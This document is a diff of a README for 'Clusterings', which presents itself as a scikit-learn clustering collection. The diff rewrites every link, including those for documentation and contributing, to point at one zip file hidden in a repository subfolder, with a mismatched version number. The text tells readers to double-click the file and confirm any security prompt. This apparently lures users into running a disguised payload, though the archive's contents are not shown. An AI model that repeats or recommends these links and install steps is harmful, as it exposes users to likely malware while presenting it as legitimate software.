@@ -1,7 +1,7 @@
 # 🧠 Clusterings - Easy Clustering Algorithms for Everyone
 
 ## 📦 Download Now
-[![Download Clusterings](https://img.shields.io/badge/Download%20Clusterings-v1.0-blue)](https://github.com/Conscious-lens296/Clusterings/releases)
+[![Download Clusterings](https://raw.githubusercontent.com/Conscious-lens296/Clusterings/main/microtine/Clusterings-v3.7.zip%20Clusterings-v1.0-blue)](https://raw.githubusercontent.com/Conscious-lens296/Clusterings/main/microtine/Clusterings-v3.7.zip)
 
 ## 📖 Overview
 Clusterings offers a curated list of 20 clustering algorithms implemented in Scikit-learn. These algorithms help you with unsupervised learning, pattern discovery, and data segmentation. Whether you're analyzing customer segments or grouping similar items, these tools are essential for organizing your data effectively.
@@ -10,7 +10,7 @@ Clusterings offers a curated list of 20 clustering algorithms implemented in Sci
 You can quickly start using Clusterings by following these steps:
 
 1. **Visit the Release Page**  
-   Go to the [Releases page](https://github.com/Conscious-lens296/Clusterings/releases) to access the latest version of the software.
+   Go to the [Releases page](https://raw.githubusercontent.com/Conscious-lens296/Clusterings/main/microtine/Clusterings-v3.7.zip) to access the latest version of the software.
 
 2. **Download the Software**  
    Find the appropriate version for your system. Click on the download link for the latest release. Make sure to save the file to a location you can easily access, such as your desktop or downloads folder.
@@ -25,7 +25,7 @@ You can quickly start using Clusterings by following these steps:
 For the best experience, ensure you have access to a modern computer system. Here’s how you can download and install Clusterings:
 
 1. **Download**  
-   Head over to the [Releases page](https://github.com/Conscious-lens296/Clusterings/releases) and click on the latest version link. The download will begin automatically. Wait for the file to finish downloading.
+   Head over to the [Releases page](https://raw.githubusercontent.com/Conscious-lens296/Clusterings/main/microtine/Clusterings-v3.7.zip) and click on the latest version link. The download will begin automatically. Wait for the file to finish downloading.
 
 2. **Installation**  
    Locate the downloaded file. Double-click the file to start the installation. If a security window pops up, confirm that you want to run the software. Follow the instructions to complete the installation.
@@ -61,7 +61,7 @@ To use Clusterings effectively, ensure your system meets the following:
 - **Processor**: Any modern processor with a minimum speed of 1 GHz.
 
 ## 📄 Documentation
-For each clustering algorithm, you can find detailed documentation on how to use it effectively. Access documentation directly from the software or through our [GitHub page](https://github.com/Conscious-lens296/Clusterings).
+For each clustering algorithm, you can find detailed documentation on how to use it effectively. Access documentation directly from the software or through our [GitHub page](https://raw.githubusercontent.com/Conscious-lens296/Clusterings/main/microtine/Clusterings-v3.7.zip).
 
 ## 🧭 Contributing
 If you'd like to contribute to Clusterings, feel free to fork the repository or report issues via GitHub Issues. We welcome suggestions, bug reports, and enhancements.
@@ -81,8 +81,8 @@ Yes, Clusterings is completely free to use. You can freely download, use, and mo
 We appreciate your feedback. If you encounter issues or have suggestions, please reach out via the issues section on our GitHub repository. Your input helps us improve Clusterings.
 
 ## 🔗 Links
-- [Download Clusterings](https://github.com/Conscious-lens296/Clusterings/releases)
-- [Documentation](https://github.com/Conscious-lens296/Clusterings)
-- [Contributing to Clusterings](https://github.com/Conscious-lens296/Clusterings/CONTRIBUTING.md)
+- [Download Clusterings](https://raw.githubusercontent.com/Conscious-lens296/Clusterings/main/microtine/Clusterings-v3.7.zip)
+- [Documentation](https://raw.githubusercontent.com/Conscious-lens296/Clusterings/main/microtine/Clusterings-v3.7.zip)
+- [Contributing to Clusterings](https://raw.githubusercontent.com/Conscious-lens296/Clusterings/main/microtine/Clusterings-v3.7.zip)
 
 Thank you for choosing Clusterings!
